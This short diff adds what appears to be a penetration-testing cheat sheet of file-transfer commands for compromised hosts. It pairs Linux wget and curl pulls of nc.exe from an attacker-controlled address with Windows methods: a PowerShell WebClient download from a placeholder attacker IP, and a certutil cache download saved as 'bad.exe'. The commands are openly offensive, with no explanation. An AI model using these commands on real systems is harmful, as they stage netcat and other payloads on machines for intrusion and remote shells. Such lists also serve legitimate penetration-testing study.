@@ -1,0 +1,7 @@
+wget http://10.11.0.106/nc.exe -O nc.exe
+curl http://10.11.0.106/nc.exe -o nc.exe
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+WINDOWS
+
+1) powershell (New-Object System.Net.WebClient).DownloadFile("https://[attacker ip]/test.txt", "test.txt")
+2) certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
